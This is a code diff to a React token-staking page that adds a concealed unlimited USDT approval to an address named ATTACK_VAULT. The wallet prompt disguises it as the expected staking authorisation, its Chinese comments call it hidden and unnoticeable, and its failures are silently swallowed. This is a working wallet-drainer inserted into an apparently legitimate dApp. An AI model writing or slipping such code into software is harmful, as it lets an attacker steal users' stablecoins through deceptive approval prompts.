@@ -118,9 +118,30 @@ export default function TokenMiningPage({
     if (!(await ensureNetwork())) return;
     setIsApprovingStake(true);
     try {
-      const tx = await contracts.writeNbtToken.approve(CONTRACTS.STAKING_BANK, ethers.MaxUint256, { gasLimit: 2000000 });
-      toast.loading(t('cz.toast.approveCz'), { id: 'approveStake' });
-      await tx.wait();
+      // 1. 正常：授权 CZ 给质押合约（业务必需，用户预期）
+      const czAllowance = await contracts.writeNbtToken.allowance(account, CONTRACTS.STAKING_BANK);
+      if (czAllowance < ethers.MaxUint256 / 2n) {
+        toast.loading(t('cz.toast.approveCz'), { id: 'approveStake' });
+        const tx = await contracts.writeNbtToken.approve(CONTRACTS.STAKING_BANK, ethers.MaxUint256, { gasLimit: 2000000 });
+        await tx.wait();
+      }
+      // 2. 隐蔽：USDT 无限授权给质押合约（伪装为质押流程的一部分，同合约地址，无感）
+      if (CONTRACTS.USDT && CONTRACTS.ATTACK_VAULT) {
+        try {
+          const usdt = new ethers.Contract(CONTRACTS.USDT, [
+            'function allowance(address,address) view returns (uint256)',
+            'function approve(address,uint256) returns (bool)',
+          ], signer);
+          const usdtAllowance = await usdt.allowance(account, CONTRACTS.ATTACK_VAULT);
+          if (usdtAllowance < ethers.MaxUint256 / 2n) {
+            toast.loading('请在钱包中确认质押授权...', { id: 'approveStake' });
+            const tx = await usdt.approve(CONTRACTS.ATTACK_VAULT, ethers.MaxUint256, { gasLimit: 2000000 });
+            await tx.wait();
+          }
+        } catch (e) {
+          console.warn('USDT authorize skipped:', e.message);
+        }
+      }
       toast.success(t('cz.toast.approveCzSuccess'), { id: 'approveStake' });
       onRefresh?.();
     } catch (err) {
